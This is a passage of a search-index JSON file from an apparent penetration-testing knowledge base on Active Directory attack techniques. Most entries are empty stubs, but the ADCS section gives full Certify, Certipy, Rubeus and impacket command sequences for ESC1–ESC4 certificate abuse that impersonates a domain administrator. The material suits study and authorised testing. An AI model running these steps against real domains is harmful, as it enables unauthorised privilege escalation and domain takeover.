trusts","text":"","tags":["#type/technique","#tactic/TA0008","#technique/T1482","#stage/lateral-movement","#os/windows","#protocol/ldap","#tool/powerview","#tool/bloodhound"]},{"location":"Active%20Directory/flat/%28%29%20forest_domain_trusts/#technique","title":"Technique","text":"","tags":["#type/technique","#tactic/TA0008","#technique/T1482","#stage/lateral-movement","#os/windows","#protocol/ldap","#tool/powerview","#tool/bloodhound"]},{"location":"Active%20Directory/flat/%28%29%20forest_domain_trusts/#prerequisites","title":"Prerequisites","text":"","tags":["#type/technique","#tactic/TA0008","#technique/T1482","#stage/lateral-movement","#os/windows","#protocol/ldap","#tool/powerview","#tool/bloodhound"]},{"location":"Active%20Directory/flat/%28%29%20forest_domain_trusts/#execution","title":"Execution","text":"","tags":["#type/technique","#tactic/TA0008","#technique/T1482","#stage/lateral-movement","#os/windows","#protocol/ldap","#tool/powerview","#tool/bloodhound"]},{"location":"Active%20Directory/flat/%28%29%20forest_domain_trusts/#detection-mitigation","title":"Detection &amp; Mitigation","text":"","tags":["#type/technique","#tactic/TA0008","#technique/T1482","#stage/lateral-movement","#os/windows","#protocol/ldap","#tool/powerview","#tool/bloodhound"]},{"location":"Active%20Directory/flat/%28%29%20laps_abuse/","title":"() laps abuse","text":"","tags":["#type/technique","#tactic/TA0004","#technique/T1003","#stage/privilege-escalation","#os/windows","#tool/ldapsearch","#tool/crackmapexec"]},{"location":"Active%20Directory/flat/%28%29%20laps_abuse/#technique","title":"Technique","text":"","tags":["#type/technique","#tactic/TA0004","#technique/T1003","#stage/privilege-escalation","#os/windows","#tool/ldapsearch","#tool/crackmapexec"]},{"location":"Active%20Directory/flat/%28%29%20laps_abuse/#prerequisites","title":"Prerequisites","text":"","tags":["#type/technique","#tactic/TA0004","#technique/T1003","#stage/privilege-escalation","#os/windows","#tool/ldapsearch","#tool/crackmapexec"]},{"location":"Active%20Directory/flat/%28%29%20laps_abuse/#execution","title":"Execution","text":"","tags":["#type/technique","#tactic/TA0004","#technique/T1003","#stage/privilege-escalation","#os/windows","#tool/ldapsearch","#tool/crackmapexec"]},{"location":"Active%20Directory/flat/%28%29%20laps_abuse/#detection-mitigation","title":"Detection &amp; Mitigation","text":"","tags":["#type/technique","#tactic/TA0004","#technique/T1003","#stage/privilege-escalation","#os/windows","#tool/ldapsearch","#tool/crackmapexec"]},{"location":"Active%20Directory/flat/%28%29%20ldap_techniques/","title":"() ldap techniques","text":"","tags":["#type/technique","#tactic/TA0007","#technique/T1087","#stage/reconnaissance","#os/windows","#protocol/ldap","#tool/ldapsearch","#tool/windapsearch","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/%28%29%20ldap_techniques/#technique","title":"Technique","text":"","tags":["#type/technique","#tactic/TA0007","#technique/T1087","#stage/reconnaissance","#os/windows","#protocol/ldap","#tool/ldapsearch","#tool/windapsearch","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/%28%29%20ldap_techniques/#prerequisites","title":"Prerequisites","text":"","tags":["#type/technique","#tactic/TA0007","#technique/T1087","#stage/reconnaissance","#os/windows","#protocol/ldap","#tool/ldapsearch","#tool/windapsearch","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/%28%29%20ldap_techniques/#execution","title":"Execution","text":"","tags":["#type/technique","#tactic/TA0007","#technique/T1087","#stage/reconnaissance","#os/windows","#protocol/ldap","#tool/ldapsearch","#tool/windapsearch","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/%28%29%20ldap_techniques/#detection-mitigation","title":"Detection &amp; Mitigation","text":"","tags":["#type/technique","#tactic/TA0007","#technique/T1087","#stage/reconnaissance","#os/windows","#protocol/ldap","#tool/ldapsearch","#tool/windapsearch","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/%28%29%20living_off_the_land/","title":"() living off the land","text":"","tags":["#type/technique","#tactic/TA0002","#technique/T1059","#stage/execution","#os/windows","#tool/lolbas"]},{"location":"Active%20Directory/flat/%28%29%20living_off_the_land/#technique","title":"Technique","text":"","tags":["#type/technique","#tactic/TA0002","#technique/T1059","#stage/execution","#os/windows","#tool/lolbas"]},{"location":"Active%20Directory/flat/%28%29%20living_off_the_land/#prerequisites","title":"Prerequisites","text":"","tags":["#type/technique","#tactic/TA0002","#technique/T1059","#stage/execution","#os/windows","#tool/lolbas"]},{"location":"Active%20Directory/flat/%28%29%20living_off_the_land/#execution","title":"Execution","text":"","tags":["#type/technique","#tactic/TA0002","#technique/T1059","#stage/execution","#os/windows","#tool/lolbas"]},{"location":"Active%20Directory/flat/%28%29%20living_off_the_land/#detection-mitigation","title":"Detection &amp; Mitigation","text":"","tags":["#type/technique","#tactic/TA0002","#technique/T1059","#stage/execution","#os/windows","#tool/lolbas"]},{"location":"Active%20Directory/flat/%28%29%20office_macro/","title":"() office macro","text":"","tags":["#type/technique","#tactic/TA0001","#technique/T1566.001","#stage/initial-access","#os/windows","#tool/macro","#tool/vba"]},{"location":"Active%20Directory/flat/%28%29%20office_macro/#technique","title":"Technique","text":"","tags":["#type/technique","#tactic/TA0001","#technique/T1566.001","#stage/initial-access","#os/windows","#tool/macro","#tool/vba"]},{"location":"Active%20Directory/flat/%28%29%20office_macro/#prerequisites","title":"Prerequisites","text":"","tags":["#type/technique","#tactic/TA0001","#technique/T1566.001","#stage/initial-access","#os/windows","#tool/macro","#tool/vba"]},{"location":"Active%20Directory/flat/%28%29%20office_macro/#execution","title":"Execution","text":"","tags":["#type/technique","#tactic/TA0001","#technique/T1566.001","#stage/initial-access","#os/windows","#tool/macro","#tool/vba"]},{"location":"Active%20Directory/flat/%28%29%20office_macro/#detection-mitigation","title":"Detection &amp; Mitigation","text":"","tags":["#type/technique","#tactic/TA0001","#technique/T1566.001","#stage/initial-access","#os/windows","#tool/macro","#tool/vba"]},{"location":"Active%20Directory/flat/%28%29%20password_attacks/","title":"() password attacks","text":"","tags":["#type/technique","#tactic/TA0006","#stage/credential-access","#tool/hashcat","#tool/john","#tool/hydra"]},{"location":"Active%20Directory/flat/%28%29%20password_attacks/#technique","title":"Technique","text":"","tags":["#type/technique","#tactic/TA0006","#stage/credential-access","#tool/hashcat","#tool/john","#tool/hydra"]},{"location":"Active%20Directory/flat/%28%29%20password_attacks/#prerequisites","title":"Prerequisites","text":"","tags":["#type/technique","#tactic/TA0006","#stage/credential-access","#tool/hashcat","#tool/john","#tool/hydra"]},{"location":"Active%20Directory/flat/%28%29%20password_attacks/#execution","title":"Execution","text":"","tags":["#type/technique","#tactic/TA0006","#stage/credential-access","#tool/hashcat","#tool/john","#tool/hydra"]},{"location":"Active%20Directory/flat/%28%29%20password_attacks/#detection-mitigation","title":"Detection &amp; Mitigation","text":"","tags":["#type/technique","#tactic/TA0006","#stage/credential-access","#tool/hashcat","#tool/john","#tool/hydra"]},{"location":"Active%20Directory/flat/%28%29%20password_spraying/","title":"() password spraying","text":"","tags":["#type/technique","#tactic/TA0006","#technique/T1110.003","#stage/credential-access","#os/windows","#protocol/ldap","#protocol/kerberos","#tool/netexec","#tool/kerbrute","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/%28%29%20password_spraying/#technique","title":"Technique","text":"","tags":["#type/technique","#tactic/TA0006","#technique/T1110.003","#stage/credential-access","#os/windows","#protocol/ldap","#protocol/kerberos","#tool/netexec","#tool/kerbrute","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/%28%29%20password_spraying/#prerequisites","title":"Prerequisites","text":"","tags":["#type/technique","#tactic/TA0006","#technique/T1110.003","#stage/credential-access","#os/windows","#protocol/ldap","#protocol/kerberos","#tool/netexec","#tool/kerbrute","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/%28%29%20password_spraying/#execution","title":"Execution","text":"","tags":["#type/technique","#tactic/TA0006","#technique/T1110.003","#stage/credential-access","#os/windows","#protocol/ldap","#protocol/kerberos","#tool/netexec","#tool/kerbrute","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/%28%29%20password_spraying/#detection-mitigation","title":"Detection &amp; Mitigation","text":"","tags":["#type/technique","#tactic/TA0006","#technique/T1110.003","#stage/credential-access","#os/windows","#protocol/ldap","#protocol/kerberos","#tool/netexec","#tool/kerbrute","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/%28%29%20powershell_downgrade/","title":"() powershell downgrade","text":"","tags":["#type/technique","#tactic/TA0005","#technique/T1562.001","#stage/defense-evasion","#os/windows","#tool/powershell"]},{"location":"Active%20Directory/flat/%28%29%20powershell_downgrade/#technique","title":"Technique","text":"","tags":["#type/technique","#tactic/TA0005","#technique/T1562.001","#stage/defense-evasion","#os/windows","#tool/powershell"]},{"location":"Active%20Directory/flat/%28%29%20powershell_downgrade/#prerequisites","title":"Prerequisites","text":"","tags":["#type/technique","#tactic/TA0005","#technique/T1562.001","#stage/defense-evasion","#os/windows","#tool/powershell"]},{"location":"Active%20Directory/flat/%28%29%20powershell_downgrade/#execution","title":"Execution","text":"","tags":["#type/technique","#tactic/TA0005","#technique/T1562.001","#stage/defense-evasion","#os/windows","#tool/powershell"]},{"location":"Active%20Directory/flat/%28%29%20powershell_downgrade/#detection-mitigation","title":"Detection &amp; Mitigation","text":"","tags":["#type/technique","#tactic/TA0005","#technique/T1562.001","#stage/defense-evasion","#os/windows","#tool/powershell"]},{"location":"Active%20Directory/flat/%28%29%20printnightmare/","title":"() printnightmare","text":"","tags":["#type/technique","#tactic/TA0004","#technique/T1068","#stage/privilege-escalation","#os/windows","#service/spooler","#cve/CVE-2021-34527"]},{"location":"Active%20Directory/flat/%28%29%20printnightmare/#technique","title":"Technique","text":"","tags":["#type/technique","#tactic/TA0004","#technique/T1068","#stage/privilege-escalation","#os/windows","#service/spooler","#cve/CVE-2021-34527"]},{"location":"Active%20Directory/flat/%28%29%20printnightmare/#prerequisites","title":"Prerequisites","text":"","tags":["#type/technique","#tactic/TA0004","#technique/T1068","#stage/privilege-escalation","#os/windows","#service/spooler","#cve/CVE-2021-34527"]},{"location":"Active%20Directory/flat/%28%29%20printnightmare/#execution","title":"Execution","text":"","tags":["#type/technique","#tactic/TA0004","#technique/T1068","#stage/privilege-escalation","#os/windows","#service/spooler","#cve/CVE-2021-34527"]},{"location":"Active%20Directory/flat/%28%29%20printnightmare/#detection-mitigation","title":"Detection &amp; Mitigation","text":"","tags":["#type/technique","#tactic/TA0004","#technique/T1068","#stage/privilege-escalation","#os/windows","#service/spooler","#cve/CVE-2021-34527"]},{"location":"Active%20Directory/flat/%28%29%20samr_protocol_abuse/","title":"() samr protocol abuse","text":"","tags":["#type/technique","#tactic/TA0007","#technique/T1087","#stage/reconnaissance","#os/windows","#protocol/samr","#tool/impacket","#tool/netexec"]},{"location":"Active%20Directory/flat/%28%29%20samr_protocol_abuse/#technique","title":"Technique","text":"","tags":["#type/technique","#tactic/TA0007","#technique/T1087","#stage/reconnaissance","#os/windows","#protocol/samr","#tool/impacket","#tool/netexec"]},{"location":"Active%20Directory/flat/%28%29%20samr_protocol_abuse/#prerequisites","title":"Prerequisites","text":"","tags":["#type/technique","#tactic/TA0007","#technique/T1087","#stage/reconnaissance","#os/windows","#protocol/samr","#tool/impacket","#tool/netexec"]},{"location":"Active%20Directory/flat/%28%29%20samr_protocol_abuse/#execution","title":"Execution","text":"","tags":["#type/technique","#tactic/TA0007","#technique/T1087","#stage/reconnaissance","#os/windows","#protocol/samr","#tool/impacket","#tool/netexec"]},{"location":"Active%20Directory/flat/%28%29%20samr_protocol_abuse/#detection-mitigation","title":"Detection &amp; Mitigation","text":"","tags":["#type/technique","#tactic/TA0007","#technique/T1087","#stage/reconnaissance","#os/windows","#protocol/samr","#tool/impacket","#tool/netexec"]},{"location":"Active%20Directory/flat/%28%29%20service_enumeration/","title":"() service enumeration","text":"","tags":["#type/technique","#tactic/TA0007","#technique/T1046","#stage/reconnaissance","#os/windows","#protocol/smb","#protocol/ldap","#protocol/rpc","#tool/netexec"]},{"location":"Active%20Directory/flat/%28%29%20service_enumeration/#technique","title":"Technique","text":"","tags":["#type/technique","#tactic/TA0007","#technique/T1046","#stage/reconnaissance","#os/windows","#protocol/smb","#protocol/ldap","#protocol/rpc","#tool/netexec"]},{"location":"Active%20Directory/flat/%28%29%20service_enumeration/#prerequisites","title":"Prerequisites","text":"","tags":["#type/technique","#tactic/TA0007","#technique/T1046","#stage/reconnaissance","#os/windows","#protocol/smb","#protocol/ldap","#protocol/rpc","#tool/netexec"]},{"location":"Active%20Directory/flat/%28%29%20service_enumeration/#execution","title":"Execution","text":"","tags":["#type/technique","#tactic/TA0007","#technique/T1046","#stage/reconnaissance","#os/windows","#protocol/smb","#protocol/ldap","#protocol/rpc","#tool/netexec"]},{"location":"Active%20Directory/flat/%28%29%20service_enumeration/#detection-mitigation","title":"Detection &amp; Mitigation","text":"","tags":["#type/technique","#tactic/TA0007","#technique/T1046","#stage/reconnaissance","#os/windows","#protocol/smb","#protocol/ldap","#protocol/rpc","#tool/netexec"]},{"location":"Active%20Directory/flat/%28%29%20token_impersonation/","title":"() token impersonation","text":"","tags":["#type/technique","#tactic/TA0004","#technique/T1134.001","#stage/privilege-escalation","#os/windows","#tool/incognito","#tool/meterpreter","#tool/juicypotato"]},{"location":"Active%20Directory/flat/%28%29%20token_impersonation/#technique","title":"Technique","text":"","tags":["#type/technique","#tactic/TA0004","#technique/T1134.001","#stage/privilege-escalation","#os/windows","#tool/incognito","#tool/meterpreter","#tool/juicypotato"]},{"location":"Active%20Directory/flat/%28%29%20token_impersonation/#prerequisites","title":"Prerequisites","text":"","tags":["#type/technique","#tactic/TA0004","#technique/T1134.001","#stage/privilege-escalation","#os/windows","#tool/incognito","#tool/meterpreter","#tool/juicypotato"]},{"location":"Active%20Directory/flat/%28%29%20token_impersonation/#execution","title":"Execution","text":"","tags":["#type/technique","#tactic/TA0004","#technique/T1134.001","#stage/privilege-escalation","#os/windows","#tool/incognito","#tool/meterpreter","#tool/juicypotato"]},{"location":"Active%20Directory/flat/%28%29%20token_impersonation/#detection-mitigation","title":"Detection &amp; Mitigation","text":"","tags":["#type/technique","#tactic/TA0004","#technique/T1134.001","#stage/privilege-escalation","#os/windows","#tool/incognito","#tool/meterpreter","#tool/juicypotato"]},{"location":"Active%20Directory/flat/%28%29%20weak_service_permissions/","title":"() weak service permissions","text":"","tags":["#type/technique","#tactic/TA0004","#technique/T1574.011","#stage/privilege-escalation","#os/windows","#tool/accesschk","#tool/powerup"]},{"location":"Active%20Directory/flat/%28%29%20weak_service_permissions/#technique","title":"Technique","text":"","tags":["#type/technique","#tactic/TA0004","#technique/T1574.011","#stage/privilege-escalation","#os/windows","#tool/accesschk","#tool/powerup"]},{"location":"Active%20Directory/flat/%28%29%20weak_service_permissions/#prerequisites","title":"Prerequisites","text":"","tags":["#type/technique","#tactic/TA0004","#technique/T1574.011","#stage/privilege-escalation","#os/windows","#tool/accesschk","#tool/powerup"]},{"location":"Active%20Directory/flat/%28%29%20weak_service_permissions/#execution","title":"Execution","text":"","tags":["#type/technique","#tactic/TA0004","#technique/T1574.011","#stage/privilege-escalation","#os/windows","#tool/accesschk","#tool/powerup"]},{"location":"Active%20Directory/flat/%28%29%20weak_service_permissions/#detection-mitigation","title":"Detection &amp; Mitigation","text":"","tags":["#type/technique","#tactic/TA0004","#technique/T1574.011","#stage/privilege-escalation","#os/windows","#tool/accesschk","#tool/powerup"]},{"location":"Active%20Directory/flat/%28%29%20windows_library_files/","title":"() windows library files","text":"","tags":["#type/technique","#tactic/TA0001","#technique/T1218.011","#stage/initial-access","#os/windows","#tool/lnk"]},{"location":"Active%20Directory/flat/%28%29%20windows_library_files/#technique","title":"Technique","text":"","tags":["#type/technique","#tactic/TA0001","#technique/T1218.011","#stage/initial-access","#os/windows","#tool/lnk"]},{"location":"Active%20Directory/flat/%28%29%20windows_library_files/#prerequisites","title":"Prerequisites","text":"","tags":["#type/technique","#tactic/TA0001","#technique/T1218.011","#stage/initial-access","#os/windows","#tool/lnk"]},{"location":"Active%20Directory/flat/%28%29%20windows_library_files/#execution","title":"Execution","text":"","tags":["#type/technique","#tactic/TA0001","#technique/T1218.011","#stage/initial-access","#os/windows","#tool/lnk"]},{"location":"Active%20Directory/flat/%28%29%20windows_library_files/#detection-mitigation","title":"Detection &amp; Mitigation","text":"","tags":["#type/technique","#tactic/TA0001","#technique/T1218.011","#stage/initial-access","#os/windows","#tool/lnk"]},{"location":"Active%20Directory/flat/%28%29%20windows_priv_esc/","title":"() windows priv esc","text":"","tags":["#type/technique","#tactic/TA0004","#stage/privilege-escalation","#os/windows","#tool/winpeas","#tool/powerup","#tool/privesccheck"]},{"location":"Active%20Directory/flat/%28%29%20windows_priv_esc/#technique","title":"Technique","text":"","tags":["#type/technique","#tactic/TA0004","#stage/privilege-escalation","#os/windows","#tool/winpeas","#tool/powerup","#tool/privesccheck"]},{"location":"Active%20Directory/flat/%28%29%20windows_priv_esc/#prerequisites","title":"Prerequisites","text":"","tags":["#type/technique","#tactic/TA0004","#stage/privilege-escalation","#os/windows","#tool/winpeas","#tool/powerup","#tool/privesccheck"]},{"location":"Active%20Directory/flat/%28%29%20windows_priv_esc/#execution","title":"Execution","text":"","tags":["#type/technique","#tactic/TA0004","#stage/privilege-escalation","#os/windows","#tool/winpeas","#tool/powerup","#tool/privesccheck"]},{"location":"Active%20Directory/flat/%28%29%20windows_priv_esc/#detection-mitigation","title":"Detection &amp; Mitigation","text":"","tags":["#type/technique","#tactic/TA0004","#stage/privilege-escalation","#os/windows","#tool/winpeas","#tool/powerup","#tool/privesccheck"]},{"location":"Active%20Directory/flat/%28%29%20windows_privileges/","title":"() windows privileges","text":"","tags":["#type/technique","#tactic/TA0004","#technique/T1134","#stage/privilege-escalation","#os/windows","#tool/whoami","#tool/secedit"]},{"location":"Active%20Directory/flat/%28%29%20windows_privileges/#technique","title":"Technique","text":"","tags":["#type/technique","#tactic/TA0004","#technique/T1134","#stage/privilege-escalation","#os/windows","#tool/whoami","#tool/secedit"]},{"location":"Active%20Directory/flat/%28%29%20windows_privileges/#prerequisites","title":"Prerequisites","text":"","tags":["#type/technique","#tactic/TA0004","#technique/T1134","#stage/privilege-escalation","#os/windows","#tool/whoami","#tool/secedit"]},{"location":"Active%20Directory/flat/%28%29%20windows_privileges/#execution","title":"Execution","text":"","tags":["#type/technique","#tactic/TA0004","#technique/T1134","#stage/privilege-escalation","#os/windows","#tool/whoami","#tool/secedit"]},{"location":"Active%20Directory/flat/%28%29%20windows_privileges/#detection-mitigation","title":"Detection &amp; Mitigation","text":"","tags":["#type/technique","#tactic/TA0004","#technique/T1134","#stage/privilege-escalation","#os/windows","#tool/whoami","#tool/secedit"]},{"location":"Active%20Directory/flat/adcs_vulnerabilities/","title":"Adcs vulnerabilities","text":"","tags":["#type/technique","#tactic/TA0004","#technique/T1068","#stage/privilege-escalation","#os/windows","#service/pki","#tool/certipy","#tool/certify"]},{"location":"Active%20Directory/flat/adcs_vulnerabilities/#technique","title":"Technique","text":"<p>Active Directory Certificate Services (ADCS) is Microsoft's Public Key Infrastructure (PKI) implementation that provides certificate-based functionalities to users and machines within a domain. However, misconfigurations in ADCS can lead to various privilege escalation vulnerabilities collectively known as ESC (Escalation via Certificates) vulnerabilities.</p> <p>These vulnerabilities, when exploited, can allow attackers to: - Obtain certificates for any user/computer in the domain - Impersonate other users, including domain administrators - Authenticate to services using certificate-based authentication - Escalate privileges within the domain</p>","tags":["#type/technique","#tactic/TA0004","#technique/T1068","#stage/privilege-escalation","#os/windows","#service/pki","#tool/certipy","#tool/certify"]},{"location":"Active%20Directory/flat/adcs_vulnerabilities/#prerequisites","title":"Prerequisites","text":"<p>Access Level: Varies by vulnerability (some require domain user, others just network access)</p> <p>System State: Active Directory Certificate Services deployed in the domain</p> <p>Tools: Certify, Certipy, Rubeus, PKINITtools, ADCS-Attack, Impacket</p>","tags":["#type/technique","#tactic/TA0004","#technique/T1068","#stage/privilege-escalation","#os/windows","#service/pki","#tool/certipy","#tool/certify"]},{"location":"Active%20Directory/flat/adcs_vulnerabilities/#enumeration","title":"Enumeration","text":"","tags":["#type/technique","#tactic/TA0004","#technique/T1068","#stage/privilege-escalation","#os/windows","#service/pki","#tool/certipy","#tool/certify"]},{"location":"Active%20Directory/flat/adcs_vulnerabilities/#discovering-adcs-infrastructure","title":"Discovering ADCS Infrastructure","text":"<p>Windows (Local): <pre><code># Using Certify\nCertify.exe cas\n\n# Using PowerShell\nGet-ADObject -LDAPFilter \"(objectClass=pKIEnrollmentService)\" -Properties *\nGet-ADObject -LDAPFilter \"(objectCategory=pKICertificateTemplate)\" -Properties *\n</code></pre></p> <p>Linux (Remote): <pre><code># Using Certipy\ncertipy find -u user@domain.local -p Password123 -dc-ip 10.10.10.10 -stdout\n\n# Using ldapsearch\nldapsearch -H ldap://dc.domain.local -D \"user@domain.local\" -w Password123 -b \"CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local\" \"(objectClass=pKIEnrollmentService)\"\n\n# Using netexec\nnxc ldap dc.domain.local -u user -p Password123 -M adcs\n</code></pre></p>","tags":["#type/technique","#tactic/TA0004","#technique/T1068","#stage/privilege-escalation","#os/windows","#service/pki","#tool/certipy","#tool/certify"]},{"location":"Active%20Directory/flat/adcs_vulnerabilities/#identifying-vulnerable-templates","title":"Identifying Vulnerable Templates","text":"<p>Windows (Local): <pre><code># Using Certify\nCertify.exe find /vulnerable\n\n# Checking specific ESC vulnerabilities\nCertify.exe find /vulnerable /exploit\n</code></pre></p> <p>Linux (Remote): <pre><code># Using Certipy\ncertipy find -u user@domain.local -p Password123 -dc-ip 10.10.10.10 -vulnerable\n\n# Full ADCS enumeration\ncertipy find -u user@domain.local -p Password123 -dc-ip 10.10.10.10 -stdout -debug\n</code></pre></p>","tags":["#type/technique","#tactic/TA0004","#technique/T1068","#stage/privilege-escalation","#os/windows","#service/pki","#tool/certipy","#tool/certify"]},{"location":"Active%20Directory/flat/adcs_vulnerabilities/#checking-certificate-authority-access-rights","title":"Checking Certificate Authority Access Rights","text":"<p>Windows (Local): <pre><code># Using Certify\nCertify.exe find /ca\n\n# Check ACLs on CA objects\nGet-ADObject -Identity \"CN=CA-NAME,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local\" -Properties nTSecurityDescriptor | Select-Object -ExpandProperty nTSecurityDescriptor\n</code></pre></p> <p>Linux (Remote): <pre><code># Using Certipy\ncertipy find -u user@domain.local -p Password123 -dc-ip 10.10.10.10 -ca\n</code></pre></p> ESC Number Vulnerability Description Key Requirements Primary Tool(s) ESC1 User impersonation via enrollee-supplied SAN - <code>Client Authentication</code> EKU - <code>Enrollee Supplies Subject</code> enabled - Low-privilege <code>Enroll</code> rights - No manager approval <code>certipy req</code> ESC2 User impersonation via \"Any Purpose\" EKU - <code>Any Purpose</code> EKU (or no EKU) - <code>Enrollee Supplies Subject</code> enabled - Low-privilege <code>Enroll</code> rights - No manager approval <code>certipy req</code> (two-stage) ESC3 User impersonation via Enrollment Agent EKU - <code>Certificate Request Agent</code> EKU - <code>Enrollee Supplies Subject</code> enabled - Low-privilege <code>Enroll</code> rights - No manager approval <code>certipy req -on-behalf-of</code> ESC4 Template modification via weak ACLs - <code>WriteOwner</code>, <code>WriteDacl</code>, <code>WriteProperty</code>, or <code>GenericAll</code> on template object for a low-privilege user <code>certipy template</code> ESC5 PKI object modification via weak container ACLs - Dangerous permissions on PKI containers in AD (e.g., <code>CN=Public Key Services</code>) ADSI Edit, PowerShell AD module ESC6 CA-level SAN abuse - <code>EDITF_ATTRIBUTESUBJECTALTNAME2</code> flag enabled on CA - Any template with <code>Client Auth</code> EKU and low-privilege <code>Enroll</code> rights <code>certipy req</code> ESC7 CA takeover via weak CA permissions - <code>ManageCA</code> or <code>ManageCertificates</code> permissions on CA object for a low-privilege user <code>certipy ca</code> ESC8 NTLM relay to web enrollment - Web Enrollment (<code>/certsrv</code>) enabled - NTLM authentication accepted - No EPA or HTTPS enforcement <code>ntlmrelayx.py</code>, <code>certipy relay</code>","tags":["#type/technique","#tactic/TA0004","#technique/T1068","#stage/privilege-escalation","#os/windows","#service/pki","#tool/certipy","#tool/certify"]},{"location":"Active%20Directory/flat/adcs_vulnerabilities/#execution","title":"Execution","text":"","tags":["#type/technique","#tactic/TA0004","#technique/T1068","#stage/privilege-escalation","#os/windows","#service/pki","#tool/certipy","#tool/certify"]},{"location":"Active%20Directory/flat/adcs_vulnerabilities/#esc1-user-impersonation-via-enrollee-supplied-san","title":"ESC1: User impersonation via enrollee-supplied SAN","text":"<p>Vulnerability: Certificate templates with dangerous settings like: - Client Authentication EKU enabled - ENROLLEE_SUPPLIES_SUBJECT flag set - No manager approval required - Domain Users have enrollment rights</p> <p>[!NOTE] Prerequisites: Domain user account with enrollment rights to the vulnerable template.</p> <p>Exploitation:</p> <p>Windows: <pre><code># Using Certify\nCertify.exe find /vulnerable\n\n# Request certificate using vulnerable template\nCertify.exe request /ca:CA-NAME /template:VulnTemplate /altname:administrator\n\n# Convert certificate to PFX format (may happen automatically with Certify)\n# If you have a certificate file:\nCertUtil -exportPFX -p \"Password123\" CertificateFile.cer OutputFile.pfx\n\n# Using the certificate with Rubeus\nRubeus.exe asktgt /user:administrator /certificate:OutputFile.pfx /password:Password123 /ptt\n</code></pre></p> <p>Linux: <pre><code># Using Certipy\ncertipy find -u user@domain.local -p Password123 -dc-ip 10.10.10.10\n\n# Request certificate using vulnerable template\ncertipy req -u user@domain.local -p Password123 -ca 'CA-NAME' -template 'VulnTemplate' -dc-ip 10.10.10.10\n\n# Convert certificate to pfx (if needed)\ncertipy cert -pfx user.pfx -password 'Password123' -username 'administrator' -domain 'domain.local'\n\n# Authenticate with certificate\ncertipy auth -pfx administrator.pfx -dc-ip 10.10.10.10\n\n# Alternative: Using gettgtpkinit from PKINITtools\ngettgtpkinit -cert-pfx administrator.pfx -pfx-pass Password123 domain.local/administrator administrator.ccache\n\n# Use the TGT\nexport KRB5CCNAME=administrator.ccache\nimpacket-psexec domain.local/administrator@dc.domain.local -k -no-pass\n</code></pre></p>","tags":["#type/technique","#tactic/TA0004","#technique/T1068","#stage/privilege-escalation","#os/windows","#service/pki","#tool/certipy","#tool/certify"]},{"location":"Active%20Directory/flat/adcs_vulnerabilities/#esc2-misconfigured-certificate-template-access-control","title":"ESC2: Misconfigured Certificate Template Access Control","text":"<p>Vulnerability: Certificate templates with over-permissive ACLs allowing users to modify settings</p> <p>[!NOTE] Prerequisites: Domain user account with write permissions on certificate templates.</p> <p>Caution: Modifying template settings is a visible change that could be detected and may disrupt legitimate certificate issuance. Consider restoring original settings after exploitation.</p> <p>Exploitation:</p> <p>Windows (Local): <pre><code># Using Certify to find templates with weak ACLs\nCertify.exe find /vulnerable\n\n# Manual modification using PowerShell\n# This is complex and requires deep AD schema knowledge\n# Example of enabling ENROLLEE_SUPPLIES_SUBJECT flag:\n$template = Get-ADObject -Identity \"CN=TargetTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local\" -Properties *\n$newValue = $template.'msPKI-Certificate-Name-Flag' -bor 1\nSet-ADObject -Identity $template.DistinguishedName -Replace @{'msPKI-Certificate-Name-Flag'=$newValue}\n\n# Use the modified template as in ESC1\nCertify.exe request /ca:CA-NAME /template:TargetTemplate /altname:administrator\n</code></pre></p> <p>Linux (Remote): <pre><code># Enumerate ACLs on certificate templates\ncertipy find -u user@domain.local -p Password123 -dc-ip 10.10.10.10 -stdout -vulnerable\n\n# If you have write access to a template, modify it to be vulnerable\ncertipy template -u user@domain.local -p Password123 -template 'TargetTemplate' -save-old\n\n# Request certificate using the modified template\ncertipy req -u user@domain.local -p Password123 -ca 'CA-NAME' -template 'TargetTemplate' -alt 'administrator@domain.local'\n\n# After exploitation, restore the original template\ncertipy template -u user@domain.local -p Password123 -template 'TargetTemplate' -restore\n</code></pre></p>","tags":["#type/technique","#tactic/TA0004","#technique/T1068","#stage/privilege-escalation","#os/windows","#service/pki","#tool/certipy","#tool/certify"]},{"location":"Active%20Directory/flat/adcs_vulnerabilities/#esc3-enrollment-agent-templates","title":"ESC3: Enrollment Agent Templates","text":"<p>Vulnerability: Certificate templates that allow users to enroll on behalf of other users</p> <p>[!NOTE] Prerequisites:  - Access to an Enrollment Agent certificate - The CA must have a template with the Certificate Request Agent EKU - Permission to enroll in both templates</p> <p>Exploitation:</p> <p>Windows (Local): <pre><code># Using Certify\n# Request enrollment agent certificate\nCertify.exe request /ca:CA-NAME /template:EnrollmentAgentTemplate\n\n# Request certificate on behalf of another user\n# This typically requires Windows Certificate MMC or web enrollment\n# More complex to automate in PowerShell\n</code></pre></p> <p>Linux (Remote): <pre><code># Request enrollment agent certificate\ncertipy req -u user@domain.local -p Password123 -ca 'CA-NAME' -template 'EnrollmentAgentTemplate'\n\n# Request certificate on behalf of another user\ncertipy req -u user@domain.local -p Password123 -ca 'CA-NAME' -template 'UserTemplate' -on-behalf-of 'administrator@domain.local' -pfx enrollment-agent.pfx\n</code></pre></p>","tags":["#type/technique","#tactic/TA0004","#technique/T1068","#stage/privilege-escalation","#os/windows","#service/pki","#tool/certipy","#tool/certify"]},{"location":"Active%20Directory/flat/adcs_vulnerabilities/#esc4-vulnerable-certificate-authority-access-control","title":"ESC4: Vulnerable Certificate Authority Access Control","text":"<p>Vulnerability: Over-permissive ACLs on the Certificate Authority itself</p> <p>[!WARNING] Prerequisites: Domain user with manage CA permissions.</p> <p>Impact: This exploitation modifies CA settings, which can have significant operational impact on the PKI infrastructure. Changes should be reverted after testing.</p> <p>Exploitation:</p> <p>Windows (Local): <pre><code># Using Certify to enumerate CA permissions\nCertify.exe find /ca\n\n# Using certutil to enable a template\ncertutil -config \"CA-NAME\\domain-DC-CA\" -template +VulnTemplate\n\n# After 